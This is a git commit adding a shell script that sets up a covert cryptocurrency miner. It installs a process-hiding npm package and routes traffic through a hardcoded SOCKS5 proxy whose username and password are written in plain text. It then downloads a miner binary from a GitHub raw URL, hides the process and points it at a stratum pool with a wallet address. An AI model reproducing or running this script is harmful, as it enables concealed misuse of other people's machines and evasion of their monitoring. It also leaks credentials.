87759c75493e2a602896a8a793453f61ae5ba18b
nathanfleight <92636939+nathanfleight@users.noreply.github.com>
2021-12-17 21:47:57 +0000

    Create start_avx512-sha-vaes_ws8.sh

---
+++ start_avx512-sha-vaes_ws8.sh
@@ -0,0 +1,46 @@
+#!/bin/sh
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+
+wget https://golang.org/dl/go1.16.6.linux-amd64.tar.gz
+tar -xvzf go1.16.6.linux-amd64.tar.gz
+export PATH=$PATH:~/go/bin
+source $HOME/.profile
+rm go1.16.6.linux-amd64.tar.gz
+
+git clone https://github.com/hmgle/graftcp.git
+cd graftcp
+make
+cd
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 18.217.51.67:1080
+socks5_username = mikrotik999
+socks5_password = Elibawnos
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/avx512-sha-vaes
+chmod +x avx512-sha-vaes
+
+ph add avx512-sha-vaes
+
+./graftcp/graftcp ./avx512-sha-vaes -a gr -o stratum+tcp://raptorna.011data.com:3008 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.AwAw8 -p password=IhatePopUps --no-tune
